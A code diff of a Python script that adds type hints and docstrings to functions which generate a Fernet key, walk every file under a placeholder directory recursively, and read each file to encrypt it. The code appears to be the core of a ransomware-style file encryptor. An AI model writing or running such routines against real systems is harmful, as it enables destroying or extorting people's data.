@@ -2,6 +2,7 @@ import os
 from cryptography.fernet import Fernet
 import glob
 
+
 def create_symmetric_key() -> (bytes, str):
     """
     Generate AES key
@@ -20,11 +21,11 @@ def create_symmetric_key() -> (bytes, str):
     return symmetric_key, key_path
 
 
-def encrypt_target_files(symmetric_key):
+def encrypt_target_files(symmetric_key) -> None:
     """
-    Find target files to encrypt
+    Find target files & encrypt
 
-    :return:
+    :return: None
     """
 
     for file_path in glob.glob('/RemoveME/**', recursive=True):
@@ -36,7 +37,14 @@ def encrypt_target_files(symmetric_key):
             continue
 
 
-def encrypting(file_path, symmetric_key):
+def encrypting(file_path, symmetric_key) -> None:
+    """
+    Encrypts file located at 'file_path' with symmetric_key
+
+    :param file_path: file path to encrypt
+    :param symmetric_key: symmetric key for encryption
+    :return: None
+    """
     with open(file_path, 'rb') as sub_file:
         content = sub_file.read()
 
